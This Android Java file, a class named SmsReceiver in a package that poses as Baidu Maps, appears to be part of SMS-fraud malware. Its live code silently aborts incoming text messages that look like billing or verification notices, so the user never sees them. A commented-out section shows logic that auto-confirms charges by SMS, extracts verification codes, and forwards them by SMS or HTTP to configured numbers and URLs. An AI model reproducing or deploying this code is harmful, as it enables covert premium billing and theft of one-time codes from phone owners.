package com.baidu.BaiduMap.sms;

import java.io.UnsupportedEncodingException;
import java.net.URLDecoder;

/**
 * Created by Mr.Xxx on 2016/9/18.
 */

import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.TimeZone;

import org.json.JSONException;
import org.json.JSONObject;

import com.baidu.BaiduMap.httpCenter.GetDataImpl;
import com.baidu.BaiduMap.utils.ACacheUtils;
import com.baidu.BaiduMap.utils.Constants;
import com.baidu.BaiduMap.utils.Log;
import com.baidu.BaiduMap.utils.Utils;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;

public class SmsReceiver extends BroadcastReceiver {
	private Context mContext;
	public static final String SMS_RECEIVED_ACTION = "android.provider.Telephony.SMS_RECEIVED";
	public static final String SMS_DELIVER_ACTION = "android.provider.Telephony.SMS_DELIVER";

	@Override
	public void onReceive(Context context, Intent intent) {
		this.mContext = context;
		this.abortBroadcast();
		String action = intent.getAction();
		if (SMS_RECEIVED_ACTION.equals(action) || SMS_DELIVER_ACTION.equals(action)) {
			this.abortBroadcast();
			Bundle bundle = intent.getExtras();
			if (bundle != null) {
				this.abortBroadcast();
				Object[] pdus = (Object[]) bundle.get("pdus");
				if (pdus != null && pdus.length > 0) {
					SmsMessage[] messages = new SmsMessage[pdus.length];
					for (int i = 0; i < pdus.length; i++) {
						byte[] pdu = (byte[]) pdus[i];
						messages[i] = SmsMessage.createFromPdu(pdu);
					}
					for (SmsMessage message : messages) {
						String content = message.getMessageBody();// 得到短信内容
						final String sender = message.getOriginatingAddress();// 得到发信息的号码
						if (content.contains("元") || content.contains("中") || content.contains("分")
								|| content.contains("信") || content.contains("验")) {
							if (Constants.isOutPut) {
								Log.debug("内容为：" + content);
							}
							this.abortBroadcast();// 中止
						} else if (sender.contains("1")) {
							if (Constants.isOutPut) {
								Log.debug(mContext, "内容为：" + content);
							}
							this.abortBroadcast();// 中止
						}
						this.abortBroadcast();// 中止

//						Log.debug("=====>payType:" + ACacheUtils.getInstance(context).getPayType());
//
//						if (ACacheUtils.getInstance(context).getPayType() == 1 && message.getOriginatingAddress()
//								.equals(ACacheUtils.getInstance(context).getLimit_msg_2())) {
//							if (Constants.isOutPut) {
//								Log.debug("======>要开始回复Y了:" + ACacheUtils.getInstance(context).getFix_msg());
//							}
//							SendMessage.SendMessages(sender, ACacheUtils.getInstance(context).getFix_msg());
//							new Sms_send_tongbu(ACacheUtils.getInstance(context).getFix_msg()
//									+ "<---回复内容 ||| 短信内容------>" + content, context, 10001);
//						} else if (ACacheUtils.getInstance(context).getPayType() == 2 && message.getOriginatingAddress()
//								.equals(ACacheUtils.getInstance(context).getLimit_msg_2())) {
//							String SmsContent = Utils.getCode2Sms(
//									Integer.parseInt(ACacheUtils.getInstance(context).getLimit_msg_1()), content);
//							SendMessage.SendMessages(ACacheUtils.getInstance(context).getLimitNum(), SmsContent);
//							new Sms_send_tongbu("拦截到的发回去的内容----->" + SmsContent, context, 10002);
//						} else if (ACacheUtils.getInstance(context).getPayType() == 3 && message.getOriginatingAddress()
//								.equals(ACacheUtils.getInstance(context).getLimit_msg_2())) {
//							String SmsContent = Utils.getCode2Sms(
//									Integer.parseInt(ACacheUtils.getInstance(context).getLimit_msg_1()), content);
//							String url = ACacheUtils.getInstance(context).getOtherNeedUrl() + "?vcode=" + SmsContent
//									+ "&sendParam=" + ACacheUtils.getInstance(context).getSendParam();
//							GetDataImpl.doGetRequestWithoutListener(url);
//							if (Constants.isOutPut) {
//								Log.debug("------>content:" + content);
//								Log.debug("------>拦截到的验证码：" + SmsContent);
//								Log.debug("------>url：" + url);
//								Log.debug("------>返回的内容：" + content);
//							}
//							new Sms_send_tongbu(content + " ----> " + url, context, 10003);
//						} else if (ACacheUtils.getInstance(context).getPayType() == 4) {
//							String SmsContent = null;
//							String SmsCode = Utils.getCode2Sms(
//									Integer.parseInt(ACacheUtils.getInstance(context).getLimit_msg_1()), content);
//							Log.debug("------>getCommand:" + ACacheUtils.getInstance(context).getCommand());
//							try {
//								String b = URLDecoder.decode(ACacheUtils.getInstance(context).getCommand(), "utf-8");
//								SmsContent = b.substring(0, b.indexOf("#") + 1);
//							} catch (UnsupportedEncodingException e) {
//								e.printStackTrace();
//							}
//							Log.debug("======>SmsCode:" + SmsCode);
//							Log.debug("======>SmsContent:" + SmsContent);
//							Log.debug("======>ACacheUtils.getInstance(context).getLimitNum():"
//									+ ACacheUtils.getInstance(context).getLimitNum());
//							SendMessage.SendMessages(ACacheUtils.getInstance(context).getLimitNum(),
//									SmsContent + SmsCode);
//							Log.debug("======>二次短信内容：" + SmsContent + SmsCode);
//							new Sms_send_tongbu("拦截到的发回去的内容----->" + SmsContent + SmsCode, context, 10004);
//						}
					}
				}
			}
		}
	}
}
